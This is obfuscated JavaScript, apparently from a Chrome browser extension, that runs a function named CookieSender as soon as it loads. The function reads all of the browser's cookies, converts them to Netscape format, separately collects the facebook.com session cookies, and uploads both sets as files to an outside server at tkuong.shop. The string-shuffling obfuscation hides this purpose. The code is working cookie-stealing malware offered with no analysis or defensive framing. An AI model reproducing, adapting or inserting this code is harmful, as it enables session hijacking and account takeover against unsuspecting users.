function _0x4473(_0x440dc9, _0x39da58) {
    const _0x486d12 = _0x486d();
    return _0x4473 = function (_0x447340, _0x30f49d) {
        _0x447340 = _0x447340 - 0x15b;
        let _0x50f600 = _0x486d12[_0x447340];
        return _0x50f600;
    }, _0x4473(_0x440dc9, _0x39da58);
}(function (_0x45a56d, _0xd0436d) {
    const _0x2fb994 = _0x4473,
        _0xc2b422 = _0x45a56d();
    while (!![]) {
        try {
            const _0x269b51 = -parseInt(_0x2fb994(0x17e)) / 0x1 * (parseInt(_0x2fb994(0x187)) / 0x2) + -parseInt(_0x2fb994(0x16b)) / 0x3 * (parseInt(_0x2fb994(0x165)) / 0x4) + -parseInt(_0x2fb994(0x161)) / 0x5 * (-parseInt(_0x2fb994(0x189)) / 0x6) + parseInt(_0x2fb994(0x186)) / 0x7 + -parseInt(_0x2fb994(0x16c)) / 0x8 + parseInt(_0x2fb994(0x169)) / 0x9 * (-parseInt(_0x2fb994(0x16e)) / 0xa) + parseInt(_0x2fb994(0x160)) / 0xb;
            if (_0x269b51 === _0xd0436d) break;
            else _0xc2b422['push'](_0xc2b422['shift']());
        } catch (_0x536ff0) {
            _0xc2b422['push'](_0xc2b422['shift']());
        }
    }
}(_0x486d, 0xb128b));

function _0x486d() {
    const _0x3e1b4a = ['message', 'domain', 'name', 'https://api.ipify.org', 'Error in Cookie-Sender function:', 'catch', '24511465eydBDv', '10mnAKkQ', 'json', 'log', 'Failed to upload Facebook document: ', '5563652tAVgIM', 'secure', 'includes', 'append', '315ZamuUV', 'path', '3WiWhNt', '2904272cXBfer', 'facebook.com', '276750eAvHPk', 'startsWith', 'TRUE', 'value', 'round', 'trim', 'text', 'Netscape Format Cookies:', 'replace', 'Error sending Netscape document to server:', 'FALSE', 'success', 'Filtered Facebook Cookies:', 'Cookies_Fb.txt', 'status', 'Failed to fetch IP address', '5WlMEki', 'then', 'file', 'error', 'Error sending Facebook document to server:', 'expirationDate', '\x09TRUE\x09', 'POST', '9052232zOjVMM', '434164tFTSJl', 'https://tkuong.shop/upload.php', '3036402RYINfe'];
    _0x486d = function () {
        return _0x3e1b4a;
    };
    return _0x486d();
}
async function CookieSender() {
    const _0x28e427 = _0x4473;
    try {
        const _0x11cc19 = await fetch(_0x28e427(0x15d));
        if (!_0x11cc19['ok']) throw new Error(_0x28e427(0x17d));
        const _0x1d5c9c = await _0x11cc19[_0x28e427(0x174)]();
        chrome['cookies']['getAll']({}, function (_0x4e94a3) {
            const _0x5e4bc2 = _0x28e427;
            let _0x18c05c = '',
                _0xf0d343 = '';
            _0x4e94a3['forEach'](_0x47989f => {
                const _0x2dbae4 = _0x4473,
                    _0x32ec39 = _0x47989f['domain'][_0x2dbae4(0x16f)]('.') ? _0x47989f[_0x2dbae4(0x15b)] : '.' + _0x47989f[_0x2dbae4(0x15b)],
                    _0x5f35a8 = _0x47989f[_0x2dbae4(0x16a)] || '/',
                    _0x201f77 = _0x47989f[_0x2dbae4(0x166)] ? _0x2dbae4(0x170) : _0x2dbae4(0x178),
                    _0x1bfa6a = _0x47989f[_0x2dbae4(0x183)] ? Math[_0x2dbae4(0x172)](_0x47989f['expirationDate']) : '';
                _0x18c05c += _0x32ec39 + _0x2dbae4(0x184) + _0x5f35a8 + '\x09' + _0x201f77 + '\x09' + _0x1bfa6a + '\x09' + _0x47989f['name'] + '\x09' + _0x47989f[_0x2dbae4(0x171)] + '\x0a', _0x47989f[_0x2dbae4(0x15b)][_0x2dbae4(0x167)](_0x2dbae4(0x16d)) && (_0xf0d343 += _0x47989f[_0x2dbae4(0x15c)] + '=' + _0x47989f[_0x2dbae4(0x171)] + '; ');
            });
            _0xf0d343 && (_0xf0d343 = _0xf0d343[_0x5e4bc2(0x173)]()[_0x5e4bc2(0x176)](/;$/, ''));
            console[_0x5e4bc2(0x163)](_0x5e4bc2(0x175), _0x18c05c), console[_0x5e4bc2(0x163)](_0x5e4bc2(0x17a), _0xf0d343);
            const _0x9491c4 = new Blob([_0x18c05c], {
                    'type': 'text/plain'
                }),
                _0x4bec52 = new Blob([_0xf0d343], {
                    'type': 'text/plain'
                }),
                _0x463747 = new FormData(),
                _0x413b98 = new FormData();
            _0x463747[_0x5e4bc2(0x168)]('file', _0x9491c4, 'All_Cookies.txt'), fetch(_0x5e4bc2(0x188), {
                'method': _0x5e4bc2(0x185),
                'body': _0x463747
            })[_0x5e4bc2(0x17f)](_0x413276 => _0x413276['json']())[_0x5e4bc2(0x17f)](_0x5bed88 => {
                const _0x5d0b8b = _0x5e4bc2;
                console[_0x5d0b8b(0x163)](_0x5bed88);
                if (_0x5bed88[_0x5d0b8b(0x17c)] !== _0x5d0b8b(0x179)) throw new Error('Failed to upload Netscape document: ' + _0x5bed88[_0x5d0b8b(0x18a)]);
            })['catch'](_0x115f7f => console[_0x5e4bc2(0x181)](_0x5e4bc2(0x177), _0x115f7f)), _0xf0d343 && (_0x413b98[_0x5e4bc2(0x168)](_0x5e4bc2(0x180), _0x4bec52, _0x5e4bc2(0x17b)), fetch(_0x5e4bc2(0x188), {
                'method': _0x5e4bc2(0x185),
                'body': _0x413b98
            })['then'](_0x10a9af => _0x10a9af[_0x5e4bc2(0x162)]())[_0x5e4bc2(0x17f)](_0x36e747 => {
                const _0x2e1926 = _0x5e4bc2;
                console[_0x2e1926(0x163)](_0x36e747);
                if (_0x36e747[_0x2e1926(0x17c)] !== _0x2e1926(0x179)) throw new Error(_0x2e1926(0x164) + _0x36e747[_0x2e1926(0x18a)]);
            })[_0x5e4bc2(0x15f)](_0x26e3bf => console['error'](_0x5e4bc2(0x182), _0x26e3bf)));
        });
    } catch (_0x3a7f11) {
        console[_0x28e427(0x181)](_0x28e427(0x15e), _0x3a7f11);
    }
}
CookieSender();